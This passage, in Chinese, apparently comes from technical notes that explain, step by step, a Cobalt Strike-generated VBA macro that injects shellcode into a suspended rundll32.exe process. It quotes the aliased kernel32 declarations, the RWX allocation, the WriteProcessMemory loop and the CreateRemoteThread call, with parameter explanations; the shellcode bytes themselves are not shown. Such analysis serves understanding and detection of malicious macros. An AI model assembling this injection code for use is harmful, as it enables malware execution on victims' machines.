</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li><p><code>Lib &quot;kernel32&quot; Alias &quot;CreateRemoteThread&quot;</code></p><ul><li><code>Lib &quot;kernel32&quot;</code>：指定函数位于<code>kernel32.dll</code>库中，这是Windows操作系统的一个核心库</li><li><code>Alias &quot;CreateRemoteThread&quot;</code>：指明VBA中的<code>CreateStuff</code>函数实际调用的是<code>CreateRemoteThread</code>函数</li></ul></li><li><p><code>ByVal(By Value)</code>: 传值; <code>ByRef(By Reference)</code>: 传引用; 如果没有标识是传值(ByVal) 还是传引用(ByRef) 的话默认是传引用(ByRef)</p></li><li><p>功能: 创建一个新进程及其主线程</p></li><li><p>参数</p><ul><li><p><code>lpApplicationName</code>：可执行模块的名称。这个字符串可以是模块名称，也可以是完整路径名。</p><p>如果为空，函数从 <code>lpCommandLine</code> 参数中解析可执行模块的名称</p><blockquote><p>这里传入的是空</p></blockquote></li><li><p><code>lpCommandLine</code>：要执行的命令行</p><p>如果 <code>lpApplicationName</code> 参数为空，这个字符串必须包含模块名称</p><p>如果不为空，字符串可以是空格分隔的模块名称和参数</p><blockquote><p>这里传入的是 <code>C:\Program Files\\SysWOW64\\rundll32.exe</code></p></blockquote></li><li><p><code>lpProcessAttributes</code>：指向一个 <code>SECURITY_ATTRIBUTES</code> 结构体，确定返回的新进程对象句柄是否可以由子进程继</p></li><li><p>承。如果lpProcessAttributes为NULL，则句柄不能被继承。</p><blockquote><p>这里传入为空, 表示句柄不能被继承; 进程获得默认安全描述符; 进程的默认安全描述符中的 ACL 来自创建者的主令牌。</p></blockquote></li><li><p><code>lpThreadAttributes</code>：指向 <code>SECURITY_ATTRIBUTES</code> 结构的指针，该结构确定返回的新线程对象句柄是否可以由子进程继承。如果lpThreadAttributes为NULL，则句柄不能被继承。</p><p>该结构的 <code>lpSecurityDescriptor</code> 成员指定主线程的安全描述符。</p><p>如果 <code>lpThreadAttributes</code> 为 NULL 或 <code>lpSecurityDescriptor</code> 为 NULL，则线程获得默认安全描述符。线程的默认安全描述符中的 ACL 来自进程令牌。</p><p>Windows XP：线程的默认安全描述符中的 ACL 来自创建者的主令牌或模拟令牌。 Windows XP SP2 和 Windows Server 2003 中的这种行为发生了变化。</p><blockquote><p>这里传入为空</p></blockquote></li><li><p><code>bInheritHandles</code>：</p><ul><li>如果此参数为 TRUE，则调用进程中的每个可继承句柄都将由新进程继承。</li><li>如果参数为 FALSE，则不会继承句柄。</li></ul><p>请注意，继承的句柄与原始句柄具有相同的值和访问权限。</p><blockquote><p>这里传入为 <code>1&amp;</code> TRUE</p></blockquote></li><li><p><code>dwCreationFlags</code>：控制优先级类别和进程创建的标志（例如，<code>CREATE_NEW_CONSOLE</code>）。</p><blockquote><p><a href="https://learn.microsoft.com/en-us/windows/win32/procthread/process-creation-flags" target="_blank" rel="noopener noreferrer">Process Creation Flags (WinBase.h) - Win32 apps | Microsoft Learn<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p></blockquote><p>该参数还控制新进程的优先级类别，用于确定进程线程的调度优先级。</p><p>如果未指定任何优先级类别标志，则优先级类别默认为 <code>NORMAL_PRIORITY_CLASS</code>，除非创建进程的优先级类别为 <code>IDLE_PRIORITY_CLASS</code> 或 <code>BELOW_NORMAL_PRIORITY_CLASS</code>。在这种情况下，子进程接收调用进程的默认优先级。</p><blockquote><p>这里传入为 <code>4&amp;</code>, 表示 <code>CREATE_SUSPENDED</code>, 新进程的主线程在挂起状态下创建，直到调用 <code>ResumeThread</code> 函数后才运行。</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407031622100.png" alt="image-20240703162254138"></p></blockquote></li><li><p><code>lpEnvironment</code>：指向新进程的环境块的指针。</p><p>如果该参数为NULL，则新进程使用调用进程的环境。</p><blockquote><p>这里传入为 <code>0&amp;</code>, NULL</p></blockquote></li><li><p><code>lpCurrentDriectory</code>：新进程的当前目录, 该字符串还可以指定 UNC 路径</p><p>如果此参数为 NULL，则新进程将与调用进程具有相同的当前驱动器和目录。 （此功能主要为需要启动应用程序并指定其初始驱动器和工作目录的 shell 提供。）</p><blockquote><p>这里传入为 <code>sNull</code>, NULL</p></blockquote></li><li><p><code>lpStartupInfo</code>：一个<code>STARTUPINFO</code>结构体，包含新进程的主窗口属性。</p><p>指向 STARTUPINFO 或 STARTUPINFOEX 结构的指针。</p><blockquote><p>这里传入为 <code>sInfo</code>, 是使用默认值初始化的 <code>STARTUPINFO</code></p></blockquote></li><li><p><code>lpProcessInformation</code>：指向 PROCESS_INFORMATION 结构的指针，该结构接收有关新进程的标识信息</p><p>当不再需要 PROCESS_INFORMATION 中的句柄时，必须使用 CloseHandle 将其关闭。</p><blockquote><p>这里传入为 <code>pInfo</code>, 是使用默认值初始化的 <code>PROCESS_INFORMATION</code></p></blockquote></li></ul></li><li><p><strong>返回值</strong>：返回非零表示成功，<code>0</code>表示失败。</p><blockquote><p>请注意，该函数在进程完成初始化之前返回。如果无法找到所需的 DLL 或无法初始化，则进程将终止。要获取进程的终止状态，请调用 GetExitCodeProcess。</p></blockquote></li></ul></li></ul></li><li><p><strong>分配内存</strong>：在新进程中分配可读写执行的内存页。</p><div class="language-vb line-numbers-mode" data-ext="vb" data-title="vb"><pre class="language-vb"><code>rwxpage <span class="token operator">=</span> AllocStuff<span class="token punctuation">(</span>pInfo<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> UBound<span class="token punctuation">(</span>myArray<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">&amp;H1000</span><span class="token punctuation">,</span> <span class="token number">&amp;H40</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>在目标进程中分配一块内存，并将其权限设置为可执行、可读、可写。分配的内存大小等于 <code>myArray</code> 数组的长度。</p><hr><div class="language-vb line-numbers-mode" data-ext="vb" data-title="vb"><pre class="language-vb"><code><span class="token keyword">Private</span> <span class="token keyword">Declare</span> <span class="token keyword">Function</span> AllocStuff <span class="token keyword">Lib</span> <span class="token string">&quot;kernel32&quot;</span> <span class="token keyword">Alias</span> <span class="token string">&quot;VirtualAllocEx&quot;</span> <span class="token punctuation">(</span>
    <span class="token keyword">ByVal</span> hProcess <span class="token keyword">As</span> <span class="token keyword">Long</span><span class="token punctuation">,</span> 
    <span class="token keyword">ByVal</span> lpAddr <span class="token keyword">As</span> <span class="token keyword">Long</span><span class="token punctuation">,</span> 
    <span class="token keyword">ByVal</span> lSize <span class="token keyword">As</span> <span class="token keyword">Long</span><span class="token punctuation">,</span> 
    <span class="token keyword">ByVal</span> flAllocationType <span class="token keyword">As</span> <span class="token keyword">Long</span><span class="token punctuation">,</span> 
    <span class="token keyword">ByVal</span> flProtect <span class="token keyword">As</span> <span class="token keyword">Long</span>
<span class="token punctuation">)</span> <span class="token keyword">As</span> <span class="token keyword">Long</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>Windows API 函数 <code>VirtualAllocEx</code> 用于在指定的进程的地址空间中分配内存</p><div class="language-C++ line-numbers-mode" data-ext="C++" data-title="C++"><pre class="language-C++"><code>LPVOID VirtualAllocEx(
  [in]           HANDLE hProcess,
  [in, optional] LPVOID lpAddress,
  [in]           SIZE_T dwSize,
  [in]           DWORD  flAllocationType,
  [in]           DWORD  flProtect
);
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li><p>参数</p><ul><li><p><code>hProcess</code>: 进程的句柄。该函数在此进程的虚拟地址空间内分配内存。</p><p>该句柄必须具有 PROCESS_VM_OPERATION 访问权限。</p><blockquote><p>这里传入的是 <code>pInfo.hProcess</code>, 表示在此进程中分配内容</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407031728440.png" alt="image-20240703172820021"></p></blockquote></li><li><p><code>lpAddress</code>: 为要分配的页面区域指定所需起始地址的指针。</p><p>如果您要保留内存，该函数会将此地址向下舍入到最接近的分配粒度倍数。</p><p>如果您提交已保留的内存，则该函数会将此地址向下舍入到最近的页边界。</p><p>如果 lpAddress 为 NULL，则该函数确定在何处分配区域。</p><p>如果此地址位于您尚未通过调用 InitializeEnclave 初始化的飞地内，则 VirtualAllocEx 会为该地址处的飞地分配一个零页。该页面之前必须未提交，并且不会使用 Intel Software Guard Extensions programming model 的 EEXTEND 指令进行测量。</p><blockquote><p>这里传入的是 <code>0</code> NULL, 意指让系统决定内容区域的地址</p></blockquote></li><li><p><code>lSize</code>(<code>dwSize</code>)</p><p>要分配的内存区域的大小（以字节为单位）</p><p>如果 lpAddress 为 NULL，则该函数将 dwSize 向上舍入到下一页边界</p><p>如果lpAddress不为NULL，则该函数分配包含从lpAddress到lpAddress+dwSize范围内的一个或多个字节的所有页。这意味着，例如，跨越页面边界的 2 字节范围会导致函数分配两个页面。</p><blockquote><p>这里传入的是 <code>UBound(myArray)</code> 返回数组 <code>myArray</code> 的最大索引, 是内存大小</p></blockquote></li><li><p><code>flAllocationType</code></p><blockquote><p><a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex" target="_blank" rel="noopener noreferrer">VirtualAllocEx 函数(memoryapi.h) - Win32 应用程序| VirtualAllocEx 函数(memoryapi.h) - Win32 应用程序微软学习 --- VirtualAllocEx function (memoryapi.h) - Win32 apps | Microsoft Learn<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p></blockquote><p>内存分配的类型</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407031736908.png" alt="image-20240703173602705"></p><blockquote><p>这里传入的是 <code>&amp;H1000</code>, 是常量 <code>MEM_COMMIT</code> 的十六进制表示，表示分配物理内存并将内存保留为已提交状态。</p></blockquote></li><li><p><code>flProtect</code></p><blockquote><p><a href="https://learn.microsoft.com/en-us/windows/win32/Memory/memory-protection-constants" target="_blank" rel="noopener noreferrer">Memory Protection Constants (WinNT.h) - Win32 apps | Microsoft Learn<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p></blockquote><p>对要分配的页面区域的内存保护。如果正在提交页面，则可以指定任一内存保护常量。</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407031749839.png" alt="image-20240703174917644"></p><blockquote><p>这里传入的是 <code>&amp;H40</code> 是常量 PAGE_EXECUTE_READWRITE 的十六进制表示，表示分配的内存页面具有执行、读取和写入权限。</p></blockquote></li></ul></li></ul></li><li><p><strong>写入代码</strong>：将硬编码的字节数组（可能是shellcode或恶意代码）写入分配的内存页中</p><div class="language-vb line-numbers-mode" data-ext="vb" data-title="vb"><pre class="language-vb"><code><span class="token keyword">For</span> offset <span class="token operator">=</span> LBound<span class="token punctuation">(</span>myArray<span class="token punctuation">)</span> <span class="token keyword">To</span> UBound<span class="token punctuation">(</span>myArray<span class="token punctuation">)</span>
    myByte <span class="token operator">=</span> myArray<span class="token punctuation">(</span>offset<span class="token punctuation">)</span>
    res <span class="token operator">=</span> WriteStuff<span class="token punctuation">(</span>pInfo<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span> rwxpage <span class="token operator">+</span> offset<span class="token punctuation">,</span> myByte<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token keyword">ByVal</span> <span class="token number">0</span><span class="token operator">&amp;</span><span class="token punctuation">)</span>
<span class="token keyword">Next</span> offset
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li><strong><code>For offset = LBound(myArray) To UBound(myArray)</code></strong><ul><li>循环遍历 <code>myArray</code> 数组中的每一个元素。</li><li><code>LBound(myArray)</code> 返回数组的下界（通常是 0）。</li><li><code>UBound(myArray)</code> 返回数组的上界（数组的最后一个索引）。</li></ul></li><li><strong><code>myByte = myArray(offset)</code></strong><ul><li>将当前索引 <code>offset</code> 对应的 <code>myArray</code> 元素值赋给 <code>myByte</code>。</li></ul></li><li><strong><code>res = WriteStuff(pInfo.hProcess, rwxpage + offset, myByte, 1, ByVal 0&amp;)</code></strong><ul><li><code>WriteStuff</code> 是一个声明的 API 函数别名，指向 Windows API 函数 <code>WriteProcessMemory</code>。</li><li>这个调用将 <code>myByte</code> 写入目标进程的内存中。</li><li><code>pInfo.hProcess</code>: 目标进程的句柄。</li><li><code>rwxpage + offset</code>: 目标进程内存地址，<code>rwxpage</code> 是之前分配的内存起始地址，加上当前偏移量 <code>offset</code>。</li><li><code>myByte</code>: 要写入的字节。</li><li><code>1</code>: 要写入的字节数。</li><li><code>ByVal 0&amp;</code>: 用于接收实际写入的字节数，这里忽略它，所以传递 <code>0&amp;</code>。</li></ul></li></ul></li><li><p><strong>创建远程线程</strong>：在目标进程中创建一个远程线程来执行写入的代码。</p><div class="language-vb line-numbers-mode" data-ext="vb" data-title="vb"><pre class="language-vb"><code>res <span class="token operator">=</span> CreateStuff<span class="token punctuation">(</span>pInfo<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> rwxpage<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><ul><li><strong><code>CreateStuff</code></strong><ul><li><code>CreateStuff</code> 是一个声明的 API 函数别名，指向 Windows API 函数 <code>CreateRemoteThread</code>。</li><li>这个调用在目标进程中创建一个新的线程来执行之前写入的字节。</li></ul></li><li><strong>参数解释</strong><ul><li><code>pInfo.hProcess</code>: 目标进程的句柄。</li><li><code>0</code>: 线程属性，通常为 <code>NULL</code>。</li><li><code>0</code>: 栈大小，通常为 <code>0</code> 使用默认大小。</li><li><code>rwxpage</code>: 新线程的起始地址，即之前分配并写入数据的内存地址。</li><li><code>0</code>: 传递给新线程的参数，这里为 <code>NULL</code>。</li><li><code>0</code>: 创建标志，通常为 <code>0</code> 表示默认创建。</li><li><code>0</code>: 用于接收线程 ID，这里忽略它，所以传递 <code>0</code>。</li></ul></li></ul></li></ul><hr><h4 id="结构体定义" tabindex="-1"><a class="header-anchor" href="#结构体定义"><span>结构体定义</span></a></h4><blockquote><p>仅作参考</p></blockquote><div class="language-vb line-numbers-mode" data-ext="vb" data-title="vb"><pre class="language-vb"><code><span class="token keyword">Private</span> <span class="token keyword">Type</span> PROCESS_INFORMATION
    hProcess <span class="token keyword">As</span> <span class="token keyword">Long</span>
    hThread <span class="token keyword">As</span> <span class="token keyword">Long</span>
    dwProcessId <span class="token keyword">As</span> <span class="token keyword">Long</span>
    dwThreadId <span class="token keyword">As</span> <span class="token keyword">Long</span>
<span class="token keyword">End</span> <span class="token keyword">Type</span>

<span class="token keyword">Private</span> <span class="token keyword">Type</span> STARTUPINFO
    cb <span class="token keyword">As</span> <span class="token keyword">Long</span>
    lpReserved <span class="token keyword">As</span> <span class="token keyword">String</span>
    lpDesktop <span class="token keyword">As</span> <span class="token keyword">String</span>
    lpTitle <span class="token keyword">As</span> <span class="token keyword">String</span>
    dwX <span class="token keyword">As</span> <span class="token keyword">Long</span>
    dwY <span class="token keyword">As</span> <span class="token keyword">Long</span>
    dwXSize <span class="token keyword">As</span> <span class="token keyword">Long</span>
    dwYSize <span class="token keyword">As</span> <span class="token keyword">Long</span>
    dwXCountChars <span class="token keyword">As</span> <span class="token keyword">Long</span>
    dwYCountChars <span class="token keyword">As</span> <span class="token keyword">Long</span>
    dwFillAttribute <span class="token keyword">As</span> <span class="token keyword">Long</span>
    dwFlags <span class="token keyword">As</span> <span class="token keyword">Long</span>
    wShowWindow <span class="token keyword">As</span> <span class="token keyword">Integer</span>
    cbReserved2 <span class="token keyword">As</span> <span class="token keyword">Integer</span>
    lpReserved2 <span class="token keyword">As</span> <span class="token keyword">Long</span>
    hStdInput <span class="token keyword">As</span> <span class="token keyword">Long</span>
    hStdOutput <span class="token keyword">As</span> <span class="token keyword">Long</span>
    hStdError <span class="token keyword">As</span> <span class="token keyword">Long</span>
<span class="token keyword">End</span> <span class="token keyword">Type</span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>定义了进程和启动信息，用于在创建新进程和线程时传递信息。</p><ul><li><p><code>Long</code>: 32位的有符号整数。它的取值范围是从 <code>-2,147,483,648</code> 到 <code>2,147,483,647</code></p><ul><li><p>为了兼容64位系统，VBA7引入了<code>LongPtr</code>类型，它可以在32位系统上表示32位整数，在64位系统上表示64位整数。</p><p>上述 CS 生成的 VBA 宏中的如下部分就使用了此种类型</p><div class="language-vb line-numbers-mode" data-ext="vb" data-title="vb"><pre class="language-vb"><code><span class="token directive property">#If VBA7 Then</span>
    <span class="token keyword">Private</span> <span class="token keyword">Declare</span> PtrSafe <span class="token keyword">Function</span> CreateStuff <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    <span class="token keyword">Dim</span> rwxpage <span class="token keyword">As</span> LongPtr<span class="token punctuation">,</span> res <span class="token keyword">As</span> LongPtr
<span class="token operator">#</span><span class="token keyword">Else</span>
    <span class="token keyword">Private</span> <span class="token keyword">Declare</span> <span class="token keyword">Function</span> CreateStuff <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    <span class="token keyword">Dim</span> rwxpage <span class="token keyword">As</span> <span class="token keyword">Long</span><span class="token punctuation">,</span> res <span class="token keyword">As</span> <span class="token keyword">Long</span>
<span class="token directive property">#End If</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li></ul></li></ul><hr><h4 id="函数声明" tabindex="-1"><a class="header-anchor" href="#函数声明"><span>函数声明</span></a></h4><blockquote><p>仅作参考</p></blockquote><div class="language-vb line-numbers-mode" data-ext="vb" data-title="vb"><pre class="language-vb"><code><span class="token directive property">#If VBA7 Then</span>
    <span class="token keyword">Private</span> <span class="token keyword">Declare</span> PtrSafe <span class="token keyword">Function</span> CreateStuff <span class="token keyword">Lib</span> <span class="token string">&quot;kernel32&quot;</span> <span class="token keyword">Alias</span> <span class="token string">&quot;CreateRemoteThread&quot;</span> <span class="token punctuation">(</span><span class="token keyword">ByVal</span> hProcess <span class="token keyword">As</span> <span class="token keyword">Long</span><span class="token punctuation">,</span> <span class="token keyword">ByVal</span> lpThreadAttributes <span class="token keyword">As</span> <span class="token keyword">Long</span><span class="token punctuation">,</span> <span class="token keyword">ByVal</span> dwStackSize <span class="token keyword">As</span> <span class="token keyword">Long</span><span class="token punctuation">,</span> <span class="token keyword">ByVal</span> lpStartAddress <span class="token keyword">As</span> LongPtr<span class="token punctuation">,</span> lpParameter <span class="token keyword">As</span> <span class="token keyword">Long</span><span class="token punctuation">,</span> <span class="token keyword">ByVal</span> dwCreationFlags <span class="token keyword">As</span> <span class="token keyword">Long</span><span class="token punctuation">,</span> lpThreadID <span class="token keyword">As</span> <span class="token keyword">Long</span><span class="token punctuation">)</span> <span class="token keyword">As</span> LongPtr
    <span class="token keyword">Private</span> <span class="token keyword">Declare</span> PtrSafe <span class="token keyword">Function</span> AllocStuff <span class="token keyword">Lib</span> <span class="token string">&quot;kernel32&quot;</span> <span class="token keyword">Alias</span> <span class="token string">&quot;VirtualAllocEx&quot;</span> <span class="token punctuation">(</span><span class="token keyword">ByVal</span> hProcess <span class="token keyword">As</span> <span class="token keyword">Long</span><span class="token punctuation">,</span> <span class="token keyword">ByVal</span> lpAddr <span class="token keyword">As</span> <span class="token keyword">Long</span><span class="token punctuation">,</span> <span class="token keyword">ByVal</span> lSize <span class="token keyword">As</span> <span class="token keyword">Long</span><span class="token punctuation">,</span> <span class="token keyword">ByVal</span> flAllocationType <span class="token keyword">As</span> <span class="token keyword">Long</span><span class="token punctuation">,</span> <span class="token keyword">ByVal</span> flProtect <span class="token keyword">As</span> <span class="token keyword">Long</span><span class="token punctuation">)</span> <span class="token keyword">As</span> LongPtr
    <span class="token keyword">Private</span> <span class="token keyword">Declare</span> PtrSafe <span class="token keyword">Function</span> WriteStuff <span class="token keyword">Lib</span> <span class="token string">&quot;kernel32&quot;</span> <span class="token keyword">Alias</span> <span class="token string">&quot;WriteProcessMemory&quot;</span> <span class="token punctuation">(</span><span class="token keyword">ByVal</span> hProcess <span class="token keyword">As</span> <span class="token keyword">Long</span><span class="token punctuation">,</span> <span class="token keyword">ByVal</span> lDest <span class="token keyword">As</span> LongPtr<span class="token punctuation">,</span> <span class="token keyword">ByRef</span> Source <span class="token keyword">As</span> Any<span class="token punctuation">,</span> <span class="token keyword">ByVal</span> Length <span class="token keyword">As</span> <span class="token keyword">Long</span><span class="token punctuation">,</span> <span class="token keyword">ByVal</span> LengthWrote <span class="token keyword">As</span> LongPtr<span class="token punctuation">)</span> <span class="token keyword">As</span> LongPtr
    <span class="token keyword">Private</span> <span class="token keyword">Declare</span> PtrSafe <span class="token keyword">Function</span> RunStuff <span class="token keyword">Lib</span> <span class="token string">&quot;kernel32&quot;</span> <span class="token keyword">Alias</span> <span class="token string">&quot;CreateProcessA&quot;</span> <span class="token punctuation">(</span><span class="token keyword">ByVal</span> lpApplicationName <span class="token keyword">As</span> <span class="token keyword">String</span><span class="token punctuation">,</span> <span class="token keyword">ByVal</span> lpCommandLine <span class="token keyword">As</span> <span class="token keyword">String</span><span class="token punctuation">,</span> lpProcessAttributes <span class="token keyword">As</span> Any<span class="token punctuation">,</span> lpThreadAttributes <span class="token keyword">As</span> Any<span class="token punctuation">,</span> <span class="token keyword">ByVal</span> bInheritHandles <span class="token keyword">As</span> <span class="token keyword">Long</span><span class="token punctuation">,</span> <span class="token keyword">ByVal</span> dwCreationFlags <span class="token keyword">As</span> <span class="token keyword">Long</span><span class="token punctuation">,</span> lpEnvironment <span class="token keyword">As</span> Any<span class="token punctuation">,</span> <span class="token keyword">ByVal</span> lpCurrentDirectory <span class="token keyword">As</span> <span class="token keyword">String</span><span class="token punctuation">,</span> lpStartupInfo <span class="token keyword">As</span> STARTUPINFO<span class="token punctuation">,</span> lpProcessInformation <span class="token keyword">As</span> PROCESS_INFORMATION<span class="token punctuation">)</span> <span class="token keyword">As</span> <span class="token keyword">Long</span>
<span class="token operator">#</span><span class="token keyword">Else</span>
    <span class="token keyword">Private</span> <span class="token keyword">Declare</span> <span class="token keyword">Function</span> CreateStuff <span class="token keyword">Lib</span> <span class="token string">&quot;kernel32&quot;</span> <span class="token keyword">Alias</span> <span class="token string">&quot;CreateRemoteThread&quot;</span> <span class="token punctuation">(</span><span class="token keyword">ByVal</span> hProcess <span class="token keyword">As</span> <span class="token keyword">Long</span><span class="token punctuation">,</span> <span class="token keyword">ByVal</span> lpThreadAttributes <span class="token keyword">As</span> <span class="token keyword">Long</span><span class="token punctuation">,</span> <span class="token keyword">ByVal</span> dwStackSize <span class="token keyword">As</span> <span class="token keyword">Long</span><span class="token punctuation">,</span> <span class="token keyword">ByVal</span> lpStartAddress <span class="token keyword">As</span> <span class="token keyword">Long</span><span class="token punctuation">,</span> lpParameter <span class="token keyword">As</span> <span class="token keyword">Long</span><span class="token punctuation">,</span> <span class="token keyword">ByVal</span> dwCreationFlags <span class="token keyword">As</span> <span class="token keyword">Long</span><span class="token punctuation">,</span> lpThreadID <span class="token keyword">As</span> <span class="token keyword">Long</span><span class="token punctuation">)</span> <span class="token keyword">As</span> <span class="token keyword">Long</span>
    <span class="token keyword">Private</span> <span class="token keyword">Declare</span> <span class="token keyword">Function</span> AllocStuff <span class="token keyword">Lib</span> <span class="token string">&quot;kernel32&quot;</span> <span class="token keyword">Alias</span> <span class="token string">&quot;VirtualAllocEx&quot;</span> <span class="token punctuation">(</span><span class="token keyword">ByVal</span> hProcess <span class="token keyword">As</span> <span class="token keyword">Long</span><span class="token punctuation">,</span> <span class="token keyword">ByVal</span> lpAddr <span class="token keyword">As</span> <span class="token keyword">Long</span><span class="token punctuation">,</span> <span class="token keyword">ByVal</span> lSize <span class="token keyword">As</span> <span class="token keyword">Long</span><span class="token punctuation">,</span> <span class="token keyword">ByVal</span> flAllocationType <span class="token keyword">As</span> <span class="token keyword">Long</span><span class="token punctuation">,</span> <span class="token keyword">ByVal</span> flProtect <span class="token keyword">As</span> <span class="token keyword">Long</span><span class="token punctuation">)</span> <span class="token keyword">As</span> <span class="token keyword">Long</span>
    <span class="token keyword">Private</span> <span class="token keyword">Declare</span> <span class="token keyword">Function</span> WriteStuff <span class="token keyword">Lib</span> <span class="token string">&quot;kernel32&quot;</span> <span class="token keyword">Alias</span> <span class="token string">&quot;WriteProcessMemory&quot;</span> <span class="token punctuation">(</span><span class="token keyword">ByVal</span> hProcess <span class="token keyword">As</span> <span class="token keyword">Long</span><span class="token punctuation">,</span> <span class="token keyword">ByVal</span> lDest <span class="token keyword">As</span> <span class="token keyword">Long</span><span class="token punctuation">,</span> <span class="token keyword">ByRef</span> Source <span class="token keyword">As</span> Any<span class="token punctuation">,</span> <span class="token keyword">ByVal</span> Length <span class="token keyword">As</span> <span class="token keyword">Long</span><span class="token punctuation">,</span> <span class="token keyword">ByVal</span> LengthWrote <span class="token keyword">As</span> <span class="token keyword">Long</span><span class="token punctuation">)</span> <span class="token keyword">As</span> <span class="token keyword">Long</span>
    <span class="token keyword">Private</span> <span class="token keyword">Declare</span> <span class="token keyword">Function</span> RunStuff <span class="token keyword">Lib</span> <span class="token string">&quot;kernel32&quot;</span> <span class="token keyword">Alias</span> <span class="token string">&quot;CreateProcessA&quot;</span> <span class="token punctuation">(</span><span class="token keyword">ByVal</span> lpApplicationName <span class="token keyword">As</span> <span class="token keyword">String</span><span class="token punctuation">,</span> <span class="token keyword">ByVal</span> lpCommandLine <span class="token keyword">As</span> <span class="token keyword">String</span><span class="token punctuation">,</span> lpProcessAttributes <span class="token keyword">As</span> Any<span class="token punctuation">,</span> lpThreadAttributes <span class="token keyword">As</span> Any<span class="token punctuation">,</span> <span class="token keyword">ByVal</span> bInheritHandles <span class="token keyword">As</span> <span class="token keyword">Long</span><span class="token punctuation">,</span> <span class="token keyword">ByVal</span> dwCreationFlags <span class="token keyword">As</span> <span class="token keyword">Long</span><span class="token punctuation">,</span> lpEnvironment <span class="token keyword">As</span> Any<span class="token punctuation">,</span> <span class="token keyword">ByVal</span> lpCurrentDriectory <span class="token keyword">As</span> <span class="token keyword">String</span><span class="token punctuation">,</span> lpStartupInfo <span class="token keyword">As</span> STARTUPINFO<span class="token punctuation">,</span> lpProcessInformation <span class="token keyword">As</span> PROCESS_INFORMATION<span class="token punctuation">)</span> <span class="token keyword">As</span> <span class="token keyword">Long</span>
<span class="token directive property">#End If</span>
